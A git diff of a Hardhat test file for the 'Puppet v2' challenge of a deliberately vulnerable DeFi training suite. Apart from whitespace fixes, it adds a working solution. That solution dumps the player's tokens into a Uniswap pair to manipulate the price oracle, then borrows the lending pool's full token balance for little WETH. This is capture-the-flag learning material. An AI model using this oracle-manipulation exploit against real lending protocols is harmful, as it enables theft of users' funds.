@@ -20,7 +20,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
@@ -29,7 +29,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();
@@ -39,7 +39,7 @@ describe('[Challenge] Puppet v2', function () {
         uniswapRouter = await UniswapRouterFactory.deploy(
             uniswapFactory.address,
             weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await token.approve(
@@ -59,7 +59,7 @@ describe('[Challenge] Puppet v2', function () {
             await uniswapFactory.getPair(token.address, weth.address)
         );
         expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
-            
+
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
             weth.address,
@@ -82,7 +82,32 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        console.log("exchange token balance", tokenEchangeBalance = await token.balanceOf(uniswapExchange.address) / 10 ** 18);
+        console.log("exchange weth balance", wethExchangeBalance = await weth.balanceOf(uniswapExchange.address) / 10 ** 18);
+
+        token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        console.log("player token balance before swap", (await token.balanceOf(player.address)) / 10 ** 18);
+        console.log("player weth balance before swap", (await weth.balanceOf(player.address)) / 10 ** 18);
+
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+        console.log("player eth", playerEth = await player.provider.getBalance(player.address));
+        
+
+
+        console.log("pool calculateDepositOfWETHRequired", requiredWeth = (await lendingPool.calculateDepositOfWETHRequired(1000000n * 10n ** 18n)));
+        await weth.connect(player).deposit({ value: (requiredWeth.sub(await weth.balanceOf(player.address))) });
+        console.log("player token balance After swapExactTokensForTokens", (await token.balanceOf(player.address)) / 10 ** 18);
+        console.log("player weth balance after swap", (await weth.balanceOf(player.address)) / 10 ** 18);
+
+        await weth.connect(player).approve(lendingPool.address, requiredWeth);
+        await lendingPool.connect(player).borrow(1000000n * 10n ** 18n);
     });
 
     after(async function () {
